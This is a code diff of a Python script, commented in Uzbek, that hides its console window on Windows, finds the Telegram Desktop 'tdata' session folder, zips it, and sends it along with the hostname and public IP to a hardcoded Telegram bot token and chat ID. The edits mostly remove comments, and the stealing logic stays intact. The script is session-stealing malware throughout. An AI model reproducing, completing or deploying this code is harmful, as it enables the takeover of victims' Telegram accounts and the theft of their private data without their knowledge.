@@ -5,21 +5,19 @@ import requests
 import socket
 import tempfile
 import time
-import os
+
 # Qora oynani yashirish uchun kod
 if os.name == 'nt':
     import ctypes
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-# ... Qolgan kodingiz shu yerdan davom etadi (BOT_TOKEN, CHAT_ID, tdata yig'ish va hokazo) ...
-# 1. Telegram Bot Tokeni (BotFather dan olganingiz)
+# 1. Telegram Bot Tokeni
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 
 # 2. Chat ID
 CHAT_ID = 7080045924
 
 # --- Yordamchi funksiyalar ---
-
 def send_telegram_message(text):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -50,11 +48,8 @@ def zip_folder(folder_path, output_path):
                     pass
 
 # --- Asosiy ishchi funksiya ---
-
 def main():
     pc_name = socket.gethostname()
-    
-    # tdata ni qidirish
     appdata = os.getenv('APPDATA')
     tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
     
@@ -79,7 +74,6 @@ def main():
             os.remove(zip_path)
         except Exception as e:
             send_telegram_message(f"❌ Xatolik: {str(e)}")
-    
     else:
         try:
             ip = requests.get('https://api.ipify.org').text
